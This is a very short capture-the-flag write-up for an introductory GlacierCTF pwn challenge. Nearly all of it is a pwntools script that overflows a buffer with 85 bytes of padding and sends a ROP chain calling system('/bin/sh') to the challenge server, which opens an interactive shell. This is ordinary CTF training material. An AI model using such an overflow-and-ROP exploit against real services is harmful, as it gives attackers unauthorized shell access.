Intro pwn chall.
The binary was statically built with PIE disabled.

```py
from pwn import *

elf = context.binary = ELF("./chall")

rop = ROP(elf)
rop.call(rop.ret)
rop.system(next(elf.search(b"/bin/sh")))

with remote("chall.glacierctf.com", 13392) as r:
    r.sendline((b"A" * 85) + rop.chain())
    r.interactive()
```